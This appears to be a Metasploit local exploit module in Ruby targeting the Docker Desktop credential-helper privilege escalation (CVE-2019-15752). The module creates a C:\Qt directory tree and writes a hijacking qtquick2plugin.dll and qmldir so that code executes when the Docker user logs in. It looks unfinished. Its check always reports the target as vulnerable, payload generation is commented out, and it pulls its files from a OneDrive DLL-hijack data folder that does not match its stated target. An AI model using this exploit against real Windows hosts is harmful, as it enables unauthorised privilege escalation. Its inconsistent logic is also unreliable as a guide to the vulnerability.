##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Docker-Credential-Wincred.exe Privilege Escalation',
        'Description' => %q{
          This exploit leverages a vulnerability in docker desktop
          community editions prior to 2.1.0.1 where an attacker can write
          a payload to a lower-privileged area to be executed
          automatically by the docker user at login.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Morgan Roman', # discovery
          'bwatters-r7', # metasploit module
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' => [[ 'Automatic', {} ]],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'WfsDelay' => 15
        },
        'DisclosureDate' => '2019-07-05',
        'Notes' =>
        {
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
        'Payload'        =>
        {
          'Space'           => 1000,
        },
        'References' => [
          ['CVE', '2019-15752'],
          ['URL', 'https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e']
        ]
      )
    )
  end


  def check
    return CheckCode::Appears
  end

  def exploit
    check_permissions!
    # make payload
#    dll_data = generate_payload_dll
    config_data = exploit_data('onedrive_dll_hijack', 'qmldir')
    dll_data = exploit_data('onedrive_dll_hijack', 'qtquick2plugin.dll')
#    donutted_dll_data = exploit_data('onedrive_dll_hijack', 'onedrive_dll_hijack_template.dll')
#    donut = 'PAYLOAD:' + 'A'*1000
#    if donutted_dll_data.include?(donut)
#      vprint_status("Found donut hole!  Filling...")
#      payload_data = payload.encoded
#      pad_size = donut.length - payload_data.length
#      padded_payload_data = payload_data + make_nops(pad_size)
#      patched_dll_data = donutted_dll_data.gsub(donut, padded_payload_data)
#    else
#      fail_with("Failed to locate donut hole in template")
#    end

    # set up directory structure
    create_directory = 'C:\\Qt'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\Qt-5.11.1'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\qml'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\QtQuick.2.7'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    # write config file
    config_dest = create_directory + '\\qmldir'
    write_file(config_dest, config_data)
    # write dll payload
    dll_dest = create_directory + '\\qtquick2plugin.dll'
    write_file(dll_dest, dll_data)
    # grab dll payload for analysis
    client.fs.file.download_file('uploaded_onedrive.dll', dll_dest)
  end

  def check_permissions!
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
    # Check if you are an admin
    # is_in_admin_group can be nil, true, or false
  end
end
